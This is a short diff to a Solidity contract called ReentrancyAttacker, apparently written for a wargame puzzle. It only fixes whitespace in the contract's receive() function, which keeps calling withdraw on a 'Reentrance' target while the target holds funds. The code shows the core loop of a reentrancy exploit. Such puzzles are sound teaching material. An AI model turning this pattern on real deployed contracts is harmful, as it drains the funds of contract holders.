@@ -11,7 +11,7 @@ contract ReentrancyAttacker is Ownable {
         puzzleContract = Reentrance(payable(_reentrance));
     }
 
-    receive () external payable {
+    receive() external payable {
         if (address(puzzleContract).balance >= msg.value) {
             puzzleContract.withdraw(msg.value);
         }
